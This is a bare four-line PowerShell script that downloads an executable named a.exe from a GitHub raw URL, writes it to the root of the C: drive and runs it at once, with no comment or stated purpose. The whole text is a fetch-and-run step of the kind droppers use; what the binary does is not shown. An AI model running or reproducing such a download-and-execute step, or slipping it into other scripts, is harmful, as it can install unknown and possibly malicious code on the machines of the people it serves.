$url = "https://github.com/sxcrate/utils/raw/main/a.exe"
$dest = "C:\a.exe"
Invoke-RestMethod -Uri $url -OutFile $dest
& "C:\a.exe"
